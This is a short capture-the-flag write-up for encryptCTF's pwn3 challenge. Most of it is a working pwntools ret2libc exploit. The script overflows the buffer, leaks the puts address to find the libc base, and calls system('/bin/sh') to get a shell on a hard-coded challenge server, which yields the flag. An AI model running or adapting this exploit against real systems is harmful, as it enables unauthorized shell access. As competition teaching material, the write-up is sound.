## encryptCTF: pwn3
##### *tl;dr: ret2libc leak*
#### Sooo uhm, I don't have the binary for the challenge with me, as well as the other material I needed to write my writeup, but I do have a saved copy of my exploit code tho HAHAHAHHAHAA. Basically, we just leak addresses from the server, compute the address for the puts function, run the offset against this [libc database](https://libc.blukat.me/), compute the libc base, get the addresses for system, exit, and the /bin/sh string to get a shell. For a better explanation of the exploit process, here is ar33zy from hackstreetboys [writeup](https://medium.com/hackstreetboys/encryptctf-2019-pwn-write-up-4-of-5-6fc5779d51fa). Anyways, here is my exploit code:
##### exploit.py
```python
from pwn import *

#: Connect to challenge server
HOST = '104.154.106.182'
PORT = 4567
p = remote(HOST,PORT)
libc = ELF('libc6_2.19-0ubuntu6.14_i386.so')
binary = ELF('./pwn3')

#: Exploit code; Stage 1
offset = 'A' * 140

libc_puts_offset = libc.symbols['puts']
puts_plt = binary.plt['puts']
puts_got = binary.got['puts']
main = binary.symbols['main']

exploit = offset + p32(puts_plt) + p32(main) + p32(puts_got)

#: Send payload; Stage 1
print(p.recvline())
print(p.recvline())
print(p.recvline())
p.sendline(exploit)
puts_leaked = u32(p.recvline()[:4])
libc_base = puts_leaked - libc_puts_offset
print('Libc base address: ' + hex(libc_base))

#: Exploit code; Stage 2
offset = 'A' * 132
system = libc_base + libc.symbols['system']
exit = libc_base + libc.symbols['system']
bin_sh = libc_base + libc.search('/bin/sh').next()
exploit = offset + p32(system) + p32(exit) + p32(bin_sh)

#: Send payload; Stage 2
p.sendline(exploit)
p.interactive()
```
#### Running it against the challenge server, we get our flag
```
encryptCTF{70_7h3_C3nt3R_0f_L!bC}
```
